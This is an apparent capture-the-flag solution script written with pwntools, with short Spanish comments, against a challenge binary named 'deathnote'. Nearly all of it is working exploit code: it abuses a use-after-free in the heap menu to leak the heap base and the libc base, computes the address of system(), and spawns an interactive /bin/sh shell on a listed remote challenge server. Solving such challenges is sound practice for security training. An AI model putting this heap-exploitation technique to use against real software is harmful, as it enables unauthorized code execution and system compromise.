from pwn import *

gs = '''
b *_+281
b *_+145
continue
'''

elf = context.binary = ELF("./deathnote")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.49.212", 30758)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

# El idx debe ser menor a 10 (idx < 10 => si malloc)
def malloc(idx, size, data):
    io.sendlineafter("💀 ", b"1")
    io.sendlineafter("💀 ", str(size).encode())    
    io.sendlineafter("💀 ", str(idx).encode())
    io.sendafter("💀 ", data)

def show(idx):
    io.sendlineafter("💀 ", b"3")
    io.sendlineafter("💀 ", str(idx).encode())
    io.recvuntil("Page content: ")
    return io.recvline()

def free(idx):
    io.sendlineafter("💀 ", b"2")
    io.sendlineafter("💀 ", str(idx).encode())


context.terminal = ['gnome-terminal', '-e']
io = start()

malloc(0, 0x70, b"A")
malloc(1, 0x70, b"A")

free(0)
# Para likear heap base me base en: https://surg.dev/ictf23/
heap_base = int(show(0).strip()[::-1].hex(), 16) << 12

print("[+] Heap Base:", hex(heap_base))

# Para likear libc
for i in range(9):
    malloc(i, 0x80, b"A"*8)

for i in range(9):
    free(i)

leak_libc = u64(show(7).strip().ljust(8, b"\x00"))

print("[+] Leak Libc:", hex(leak_libc))

libc.address = leak_libc + 0x840 - libc.sym.tzname

print("[+] Libc base: ", hex(libc.address))

print("[+] System: ", hex(libc.sym.system))

#malloc(0, 0x80, b"B"*16)
# Esto se debe a: 
# pcVar2 = (code *)strtoull(*param_1,(char **)0x0,0x10);
system_address = hex(libc.sym.system)[2::]

malloc(0, 0x80, str(system_address))

malloc(1, 0x80, b"/bin/sh\x00")


io.interactive()
